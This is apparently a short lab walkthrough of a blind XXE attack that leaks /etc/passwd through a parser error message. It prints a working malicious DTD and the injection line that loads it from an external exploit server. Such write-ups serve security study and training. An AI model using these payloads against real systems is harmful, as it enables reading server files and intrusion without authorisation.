We first find the site where the application uses XML: 
![](imgs/blind_xxe_exfiltrate_via_error_message.png)

We can now create the error message data exfiltration payload:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval; %exfil;
```

This creates an XML entity called file that displays the content of `/etc/passwd` but this variable is not being used literally, instead, an error is triggering on purpose that uses `%file` to display the file on the error message.

We store this malicious DTD in our exploit server:
![](imgs/blind_xxe_exfiltrate_via_error_message-1.png)

And we add an XXE pointing to this exploit server:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

This way, the malicious DTD will be loaded, executed, an error will be triggered and this error will contain the contents of the variable:
![](imgs/blind_xxe_exfiltrate_via_error_message-2.png)

Note that if we try to exfiltrate the file directly, without error message:
![](imgs/blind_xxe_exfiltrate_via_error_message-3.png)

We cannot due to it having illegal characters (it is being validated in some way):
![](imgs/blind_xxe_exfiltrate_via_error_message-4.png)
Therefore, the error message is a way to bypasse some input validations.